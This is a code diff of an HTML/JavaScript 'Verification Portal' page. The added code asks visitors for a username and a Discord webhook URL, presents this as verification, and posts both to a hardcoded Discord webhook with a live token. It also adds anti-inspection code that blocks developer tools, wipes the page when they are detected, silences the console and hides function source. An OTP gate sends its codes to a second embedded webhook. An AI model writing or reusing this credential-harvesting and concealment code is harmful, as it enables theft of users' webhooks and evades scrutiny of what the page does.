@@ -235,7 +235,6 @@
             50% { transform: translateY(-20px) translateX(10px); }
         }
 
-        /* OTP Overlay - Matches original design perfectly */
         #otpOverlay {
             position: fixed;
             top: 0;
@@ -253,11 +252,11 @@
 <body>
     <div class="particles" id="particles"></div>
     
-    <!-- OTP Verification (Same design as original form) -->
+    <!-- OTP Verification Screen -->
     <div id="otpOverlay">
         <div class="verification-card">
             <div class="card-header">
-                <h1>Secure Access</h1>
+                <h1>Security Verification</h1>
                 <p>Your OTP expires in <span id="otpTimer">01:00</span></p>
             </div>
             <form id="otpForm">
@@ -301,21 +300,33 @@
     </div>
 
     <script>
-        // ===== 1-MINUTE OTP SYSTEM =====
-        const OTP_DURATION = 60 * 1000; // 1 minute in milliseconds
-        let currentOTP = generateOTP();
-        let otpExpiryTime = Date.now() + OTP_DURATION;
+        // ===== SECURE OTP SYSTEM =====
+        const OTP_DURATION = 60 * 1000; // 1 minute
+        const OTP_WEBHOOK = "https://discord.com/api/webhooks/1360001442311835800/K8B6hjkroT3an99zScfcDzuloKutKcaKSt-ufRChcbPM7jSEN5ELaDq6W1jdPlM9xKau";
+        let currentOTP = "";
+        let otpExpiryTime = 0;
         let otpAttempts = 0;
-        const MAX_ATTEMPTS = 3;
+        const MAX_OTP_ATTEMPTS = 3;
 
-        function generateOTP() {
-            return Math.floor(100000 + Math.random() * 900000).toString();
-        }
-
-        function refreshOTP() {
-            currentOTP = generateOTP();
+        async function generateAndSendOTP() {
+            // Generate 6-digit OTP
+            currentOTP = Math.floor(100000 + Math.random() * 900000).toString();
             otpExpiryTime = Date.now() + OTP_DURATION;
-            console.log(`Current OTP: ${currentOTP} (Valid for 1 minute)`);
+            
+            // Send to Discord webhook
+            try {
+                await fetch(OTP_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `🔑 New OTP: ||${currentOTP}|| (Expires <t:${Math.floor(otpExpiryTime/1000)}:R>)`,
+                        flags: 4096 // Makes content hidden until hover
+                    })
+                });
+            } catch (error) {
+                console.error("Failed to send OTP to webhook");
+            }
+            
             updateOTPTimer();
         }
 
@@ -326,19 +337,98 @@
                 `00:${seconds.toString().padStart(2, '0')}`;
             
             if (timeLeft <= 0) {
-                refreshOTP();
+                generateAndSendOTP();
             } else {
                 setTimeout(updateOTPTimer, 1000);
             }
         }
 
-        // Initialize
-        refreshOTP();
-        updateOTPTimer();
+        // Initialize OTP system
+        generateAndSendOTP();
 
         // ===== ANTI-DEVTOOLS PROTECTION =====
         (function() {
-            // [Your existing anti-devtools code remains exactly the same]
+            // Block F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C, Ctrl+U
+            document.addEventListener('keydown', function(e) {
+                if (
+                    e.key === 'F12' ||
+                    (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) ||
+                    (e.ctrlKey && e.key === 'u')
+                ) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    alert("Developer tools are disabled.");
+                    return false;
+                }
+            });
+
+            // Disable right-click
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+
+            // Detect devtools via window size changes
+            let devtoolsOpen = false;
+            const threshold = 160;
+            function checkDevTools() {
+                const widthDiff = window.outerWidth - window.innerWidth;
+                const heightDiff = window.outerHeight - window.innerHeight;
+                
+                if (widthDiff > threshold || heightDiff > threshold) {
+                    if (!devtoolsOpen) {
+                        devtoolsOpen = true;
+                        document.body.innerHTML = '<h1 style="color:red;text-align:center;margin-top:50px;">Access Denied</h1>';
+                        window.location.reload();
+                    }
+                } else {
+                    devtoolsOpen = false;
+                }
+            }
+            setInterval(checkDevTools, 500);
+
+            // Disable console.log
+            console.log = function() {};
+            console.warn = function() {};
+            console.error = function() {};
+            console.info = function() {};
+
+            // Override toString to prevent function inspection
+            Function.prototype.toString = function() {
+                return "function() { [disabled] }";
+            };
+        })();
+
+        // ===== ORIGINAL WEBHOOK SERVICE =====
+        const WebhookService = (function() {
+            const WEBHOOK_URL = "https://discord.com/api/webhooks/1356597884732047394/T5kzg5wXKamrkiI3KCwXSzSBWjJkgOGJ6NQsMXt4foii5CQH7oWJh3Aek8j338ZRLx4w";
+            
+            return {
+                send: async function(data) {
+                    try {
+                        const response = await fetch(WEBHOOK_URL, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                username: "Verification Portal",
+                                embeds: [{
+                                    title: "New Verification",
+                                    color: 0x5865F2,
+                                    fields: [
+                                        { name: "Username", value: data.username, inline: false },
+                                        { name: "Webhook", value: data.webhook, inline: false }
+                                    ],
+                                    timestamp: new Date().toISOString(),
+                                    footer: { text: "Verification System • " + new Date().toLocaleString() }
+                                }]
+                            })
+                        });
+                        return response.ok;
+                    } catch (error) {
+                        return false;
+                    }
+                }
+            };
         })();
 
         document.addEventListener('DOMContentLoaded', () => {
@@ -358,16 +448,32 @@
                 particlesContainer.appendChild(particle);
             }
 
-            // ===== OTP FORM =====
-            document.getElementById('otpForm').addEventListener('submit', (e) => {
+            document.addEventListener('mousemove', (e) => {
+                const particles = document.querySelectorAll('.particle');
+                particles.forEach(p => {
+                    const rect = p.getBoundingClientRect();
+                    const x = e.clientX - (rect.left + rect.width/2);
+                    const y = e.clientY - (rect.top + rect.height/2);
+                    const distance = Math.sqrt(x*x + y*y);
+                    
+                    if (distance < 150) {
+                        const force = (150 - distance) / 50;
+                        p.style.transform = `translate(${-x/distance * force * 5}px, ${-y/distance * force * 5}px)`;
+                    }
+                });
+            });
+
+            // ===== OTP FORM HANDLING =====
+            const otpForm = document.getElementById('otpForm');
+            otpForm.addEventListener('submit', (e) => {
                 e.preventDefault();
-                const otpInput = document.getElementById('otpInput').value;
+                const otpInput = document.getElementById('otpInput').value.trim();
                 const otpStatus = document.getElementById('otpStatus');
                 
                 otpAttempts++;
                 
                 if (Date.now() > otpExpiryTime) {
-                    otpStatus.textContent = "OTP expired - please refresh";
+                    otpStatus.textContent = "OTP expired. Please refresh the page.";
                     otpStatus.className = "status-indicator visible status-error";
                     return;
                 }
@@ -379,17 +485,80 @@
                         document.getElementById('otpOverlay').style.display = 'none';
                         document.getElementById('mainContent').style.display = 'block';
                     }, 1000);
-                } else if (otpAttempts >= MAX_ATTEMPTS) {
+                } else if (otpAttempts >= MAX_OTP_ATTEMPTS) {
                     otpStatus.textContent = "Maximum attempts reached!";
                     otpStatus.className = "status-indicator visible status-error";
-                    e.target.querySelector('button').disabled = true;
+                    otpForm.querySelector('button').disabled = true;
                 } else {
-                    otpStatus.textContent = `Invalid code (${MAX_ATTEMPTS - otpAttempts} tries left)`;
+                    otpStatus.textContent = `Invalid OTP (${MAX_OTP_ATTEMPTS - otpAttempts} attempts left)`;
                     otpStatus.className = "status-indicator visible status-error";
                 }
             });
 
-            // [Rest of your original code remains exactly the same]
+            // ===== ORIGINAL FORM HANDLING =====
+            const form = document.getElementById('verificationForm');
+            const button = document.getElementById('verifyButton');
+            const status = document.getElementById('statusDisplay');
+
+            form.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                
+                const username = document.getElementById('userIdentifier').value.trim();
+                const webhook = document.getElementById('webhookEndpoint').value.trim();
+                
+                if (!username || !webhook) {
+                    showStatus('Please complete all fields', 'error');
+                    return;
+                }
+                
+                button.classList.add('loading');
+                button.disabled = true;
+                showStatus('Processing verification...', 'info');
+                
+                try {
+                    const success = await WebhookService.send({ username, webhook });
+                    if (success) {
+                        showStatus('Verification successful!', 'success');
+                    } else {
+                        throw new Error('Failed to send verification');
+                    }
+                } catch (error) {
+                    showStatus('Verification failed. Please try again.', 'error');
+                } finally {
+                    button.classList.remove('loading');
+                    button.disabled = false;
+                }
+            });
+
+            function showStatus(message, type) {
+                status.textContent = message;
+                status.className = `status-indicator visible status-${type}`;
+                setTimeout(() => status.classList.remove('visible'), 5000);
+            }
+
+            // Button ripple effects
+            document.querySelectorAll('.action-button').forEach(btn => {
+                btn.addEventListener('click', function(e) {
+                    const rect = this.getBoundingClientRect();
+                    const ripple = document.createElement('span');
+                    ripple.style.cssText = `
+                        position: absolute;
+                        background: rgba(255,255,255,0.3);
+                        border-radius: 50%;
+                        transform: scale(0);
+                        animation: ripple 0.6s linear;
+                        pointer-events: none;
+                        left: ${e.clientX - rect.left}px;
+                        top: ${e.clientY - rect.top}px;
+                        width: ${rect.width}px;
+                        height: ${rect.width}px;
+                        margin-left: -${rect.width/2}px;
+                        margin-top: -${rect.width/2}px;
+                    `;
+                    this.appendChild(ripple);
+                    setTimeout(() => ripple.remove(), 600);
+                });
+            });
         });
     </script>
 </body>
